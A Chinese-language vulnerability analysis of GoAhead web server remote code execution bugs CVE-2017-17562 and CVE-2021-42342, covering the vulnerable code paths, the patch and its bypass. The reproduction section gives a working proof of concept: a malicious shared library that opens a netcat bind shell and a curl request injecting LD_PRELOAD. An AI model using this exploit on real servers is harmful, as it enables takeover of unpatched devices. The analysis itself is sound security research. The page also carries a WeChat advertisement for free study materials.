## 一、前言

### 1.1 下载地址

## 二、CVE-2017-17562

### 2.1 漏洞分析

`cve-2017-17562`远程命令执行漏洞影响`Goahead 2.5.0`到`Goahead
3.6.5`之间的版本。在`cgiHandler`函数中，将用户的HTTP请求参数作为环境变量，通过诸如`LD_PRELOAD`即可劫持进程的动态链接库，实现远程代码执行。

### 2.2 代码分析

漏洞成因位于`cgiHandler`函数中。代码首先拼接出用户请求的cgi完整路径并赋予`cgiPath`，然后检查此文件是否存在以及是否为可执行文件。随后就是存在漏洞的关键代码处，如下图所示：

![image-20220811093450785.png](https://image.3001.net/images/20220826/1661501969_63088211c6e2357e616a1.png!small)

代码将用户请求的参数存入环境变量数组`envp`中，但是不能为`REMOTE_HOST`和`HTTP_AUTHORIZATION`。从这里不难看出黑名单的过滤非常有限，这也为攻击者提供了利用点。
如下图所示代码继续往下执行，将`webGetCgiCommName`函数的返回值保存在`stdIn`与`stdOut`中，此函数将返回一个默认路径位于`/tmp`文件名格式`cgi-*.tmp`的绝对路径字符串。
随后代码将`cgiPath`、`envp`、`stdIn`与`stdOut`作为参数传入`launchCgi`函数中。

![image-20220811094108913.png](https://image.3001.net/images/20220826/1661501970_63088212a21a360b01ddd.png!small)

    
    
    PUBLIC char *websGetCgiCommName()  
    {  
    return websTempFile(NULL, "cgi");  
    }  
    ​  
    PUBLIC char *websTempFile(char *dir, char *prefix)  
    {  
    static int count = 0;  
    char   sep;  
    ​  
    sep = '/';  
    if (!dir || *dir == '\0') {  
    #if WINCE  
    dir = "/Temp";  
    sep = '\\';  
    #elif ME_WIN_LIKE  
    dir = getenv("TEMP");  
    sep = '\\';  
    #elif VXWORKS  
    dir = ".";  
    #else  
    dir = "/tmp";  
    #endif  
    }  
    if (!prefix) {  
    prefix = "tmp";  
    }  
    return sfmt("%s%c%s-%d.tmp", dir, sep, prefix, count++);  
    }

进入`launchCgi`函数，根据注释可知此函数为cgi启动函数。代码首先打开了两个`tmp`文件，随后fork子进程并在子进程中将标准输入与标准输出重定向到两个打开的文件描述符上，最后调用`execve`函数在子进程中执行cgi程序。

![image-20220811095236691.png](https://image.3001.net/images/20220826/1661501971_630882137668d2cd26ac0.png!small)

至此漏洞相关代码分析完毕，代码在执行`execve`函数时将`cgiHandler`函数解析的`envp`数组作为第三个参数传入，攻击者可以在请求参数时通过`LD_PRELOAD`环境变量配合代码重定向后`/proc/self/fd/0`指向POST数据实现动态链接库的劫持。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

### 2.3 漏洞复现

下载编译并通过`gdb`运行存在漏洞的`Goahead`程序（3.6.4）

    
    
    git clone https://github.com/embedthis/goahead.git  
    cd goahead   
    make  
    cd test  
    gcc ./cgitest.c -o cgi-bin/cgitest  
    sudo gdb ../build/linux-x64-default/bin/goahead

编写恶意动态链接库，代码以及编译命令如下所示：

    
    
    #include <stdio.h>  
    #include <stdlib.h>  
    ​  
    static void main(void) __attribute__((constructor));  
    ​  
    static void main(void) {  
    system("nc -lp 8888 -e /bin/sh");  
    }  
    ​  
    // gcc --shared -fPIC poc.c -o poc.so

构造`HTTP`请求发送

    
    
    curl -vv -XPOST --data-binary @./poc.so localhost/cgi-bin/cgitest?LD_PRELOAD=/proc/self/fd/0

断点下在`execve`函数处，此时内存情况如下图所示，`envp`数组中存在我们注入的恶意环境变量`LD_PRELOAD`并指向`/proc/self/fd/0`文件。在代码分析中我们了解到，`launchCgi`函数会在子进程中将标准输入输出重定向到`cgi-*.tmp`的文件描述符，而根据以往的经验`POST`数据会作为`cgi`的标准输入，也就是说此时`/proc/self/fd/0`所指向的正是我们的恶意文件`poc.so`，当`execve`函数执行时，即可劫持进程动态链接库实现RCE。

![image-20220811102106361.png](https://image.3001.net/images/20220826/1661501972_6308821466a60ef7f4d50.png!small)

### 2.4 补丁分析

首先是在`cgiHandler`函数中添加了更加完整的过滤检测，使得`LD_`开头的字符串无法写入`envp`数组。

![image-20220811110039169.png](https://image.3001.net/images/20220826/1661501973_630882158fa116b02d509.png!small)

其次是增加了一层`if`判断，当`s-arg`不为`0`时进行字符串拼接。根据索引找到`s-arg`的赋值语句位于`addFormVars`函数中，此函数是`Goahead`处理`content-type`为`application/x-www-form-urlencoded`的`HTTP`请求时会调用。

![image-20220811110610000.png](https://image.3001.net/images/20220826/1661501974_630882166e72b55152c93.png!small)

## 三、cve-2021-42342

### 3.1 漏洞分析

`cve-2021-42342`远程命令执行漏洞影响`Goahead 4.X`和部分`Goahead
5.X`版本。在分析`cve-2017-17562`的补丁时我们了解到新版的程序对黑名单的完整性上做了优化，然而在`4.X`版本中增加了一句`strim`函数对用户参数的处理，如下图所示：

![image-20220811113111112.png](https://image.3001.net/images/20220826/1661501975_6308821767f7e7258bf6e.png!small)

进入这个函数，当第二个参数为`0`时`return
0`。因为开发人员对于`strim`函数使用规范的错误使得针对`cve-2017-17562`的黑名单完善形同虚设。

![image-20220811113314099.png](https://image.3001.net/images/20220826/1661501976_630882183f0ed379aa7f7.png!small)

上文在对`cve-2017-17562`补丁进行分析时曾经提到，`s-arg`在`addFormVars`函数中赋值为`1`，为了实现环境变量注入则必须使`s-arg`为`0`，绕过的方式也很简单令`header`中`content-type`为`multipart/form-data`即可。

![image-20220811114255209.png](https://image.3001.net/images/20220826/1661501976_63088218ea13d1aa2b7c2.png!small)

后续利用方式与`cve-2017-17562`相同，笔者就不做重复分析了。

### 3.2 代码分析

为了更好的了解漏洞的完整执行流程，这里笔者针对`Goahead`处理`Http`的机制进行深入分析，其中不对的地方欢迎师傅们指正。​
在`Goahead`进行启动后会执行`websServer`函数进行初始化操作。其中`websOpen`函数对`route.txt`文件进行解析，关于`route`处理可以看一下[layty](https://www.cnblogs.com/zongzi10010/p/12109380.html)师傅的文章。

![image-20220811115146522.png](https://image.3001.net/images/20220826/1661501977_63088219a12538dc73143.png!small)

`websOpen`函数会根据配置启动相应的代码模块

![image-20220811120341916.png](https://image.3001.net/images/20220826/1661501978_6308821a67e7f36a35ca1.png!small)

其中关于cgi请求的回调函数通过`websDefineHandler`函数定义。

![image-20220811120257469.png](https://image.3001.net/images/20220826/1661501979_6308821b268ae26253dea.png!small)

`websOpen`函数执行完毕后返回`websServer`函数并调用`websListen`启动`HTTP`服务。代码如下所示，当接收到`HTTP`请求时调用回调函数`websAccept`函数进行处理。

![image-20220811115851803.png](https://image.3001.net/images/20220826/1661501979_6308821bcfca6f4d45e05.png!small)

在`websAccept`函数中调用`websAlloc`函数为请求分配内存地址，添加入`webs`列表中。

![image-20220811160104952.png](https://image.3001.net/images/20220826/1661501980_6308821c86b79c30e60fe.png!small)​

其中`websAlloc`函数调用`initWebs`函数对`Webs`结构体进行初始化。

![image-20220811160541882.png](https://image.3001.net/images/20220826/1661501981_6308821d5ef3f4999201c.png!small)

此时`Goahead`完成了对`Http`请求的初始化操作，而针对`Http`请求的处理工作则是通过执行`websAccept`->`socketEvent`->`readEvent`完成响应的

![image-20220811161242351.png](https://image.3001.net/images/20220826/1661501982_6308821e2eb1a73226048.png!small)

调用`websRead`函数将数据写入到`wp->rxbuf`缓冲区中，随后执行`websPump`函数。如下图所示，在`Goahead`中将`HTTP`的处理流程分为了五个状态，每个状态由不同的函数进行配置和处理工作。

![image-20220811161448355.png](https://image.3001.net/images/20220826/1661501983_6308821f11f018f3c55e9.png!small)

#### 3.2.1 WEBS_BEGIN

`WEBS_BEGIN`阶段由`parseIncoming`函数负责处理，代码如下图所示。其中我们需要重点关注调用的三个函数`parseFirstLine`、`parseHeaders`、`websRouteRequest`函数。​
`parseFirstLine`函数负责将请求的`类型`、`url`、`协议版本`和请求参数保存在`wp`结构体中

![image-20220811162025350.png](https://image.3001.net/images/20220826/1661501983_6308821fe7a98ff9280ef.png!small)

`parseHeaders`函数负责对请求头进行解析，其中对请求头中`content-type`键处理流程如下图所示。为了满足漏洞的触发条件`s->arg`为`0`，所以我们需要绕过`addFormVars`函数，即请求头`content-type`为`multipart/form-data`。

![image-20220811164409301.png](https://image.3001.net/images/20220826/1661501984_63088220c43b5d37d93f1.png!small)

函数用于确定`HTTP`请求的处理函数。通过`url`路径与`route->prefix`进行比较确定最终处理函数，并将结果保存在`wp->route`中。其中`routes`数组保存了`route.txt`文件解析后，所有处理函数的相关数据。

![image-20220811165458877.png](https://image.3001.net/images/20220826/1661501985_630882218ab984c6255b3.png!small)

调用`websGetCgiCommName`函数创建文件名格式为`cgi-*.tmp`的临时文件用于保存POST数据。

![image-20220811231634964.png](https://image.3001.net/images/20220826/1661501986_63088222937d398cde0b4.png!small)

#### 3.2.2 WEBS_CONTENT

返回`websPump`函数，随后调用`processContent`函数。函数部分代码如下所示，其中`filterChunkData`函数检测数据是否全部处理完毕，`websProcessUploadData`函数为处理上传文件的函数。

![image-20220811170228936.png](https://image.3001.net/images/20220826/1661501987_6308822354515296cc9ff.png!small)

进入函数后可以看到上传操作被分为五个状态，每种状态由专门的函数负责处理，如下图所示。​
`initUpload`函数切换`wp->uploadState`状态为`initUpload`，初始化上传路径并确定上传请求边界符。​
`processContentBoundary`函数判断数据是否已经处理完毕，若是则将状态切换为`UPLOAD_CONTENT_END`，若还有数据未处理完成则切换状态为`UPLOAD_CONTENT_HEADER`。​
`processUploadHeader`函数通过调用`websTempFile`函数创建用于暂存上传数据的临时文件，文件名格式`/tmp/tmp-*.tmp`，将临时文件的文件描述符保存在`wp->upfd`中。​
`processContentData`函数调用`writeToFile`函数将上传的数据保存在临时文件中，并修改上传状态为`UPLOAD_BOUNDARY`判断数据是否上传完毕。

![image-20220811170418725.png](https://image.3001.net/images/20220826/1661501988_63088224492880a15077b.png!small)

当全部数据处理完毕后`wp->eof`置`1`，`wp->state`状态更改为`WEBS_READY`。​
返回`processContent`函数后继续执行，调用`websProcessCgiData`函数将`POST`数据保存在临时文件`cgi-*.tmp`中

![image-20220811232449220.png](https://image.3001.net/images/20220826/1661501989_630882252274264e2b9d4.png!small)

#### 3.2.3 WEBS_READY

程序流程返回`websPump`函数后，在`WEBS_READY`阶段调用`websRunRequest`函数，此函数主要负责切换`wp->state`为`WEBS_RUNNING`，并调用`cgiHandler`函数。

![image-20220811223716380.png](https://image.3001.net/images/20220826/1661501990_63088226083b6d9bd0ee0.png!small)

在代码执行到漏洞位置时，`s->arg`值为零完成绕过。后续的利用原理与`cve-2017-17562`类似，这里就不过多赘述。

![image-20220811232629208.png](https://image.3001.net/images/20220826/1661501991_630882270c82c538fc886.png!small)

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

